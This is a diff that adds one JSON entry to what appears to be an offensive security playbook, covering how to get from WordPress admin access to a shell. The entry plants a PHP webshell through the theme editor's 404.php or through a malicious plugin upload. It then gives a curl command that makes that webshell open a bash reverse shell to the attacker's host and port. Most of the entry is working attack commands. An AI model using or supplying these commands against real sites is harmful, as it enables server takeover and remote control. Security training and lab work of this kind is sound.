@@ -1,0 +1,14 @@
+{
+  "id": "wp_shell",
+  "phase": "WEB",
+  "title": "WordPress → Shell",
+  "body": "Two paths: theme editor (Appearance → Theme Editor → 404.php) or malicious plugin zip. Both drop a webshell.",
+  "cmd": "# Option 1: Theme Editor\n# Appearance > Theme Editor > select 404.php\n# Add: <?php system($_GET['cmd']); ?>\n# Access: http://$ip/wp-content/themes/<theme>/404.php?cmd=id\n\n# Option 2: Malicious Plugin\n# Create plugin zip with PHP shell inside\n# Upload via Plugins > Add New > Upload\n\n# Once confirmed RCE — reverse shell\ncurl \"http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$lhost/$lport+0>%261'\"",
+  "warn": null,
+  "choices": [
+    {
+      "label": "RCE confirmed — catch shell",
+      "next": "reverse_shell"
+    }
+  ]
+}
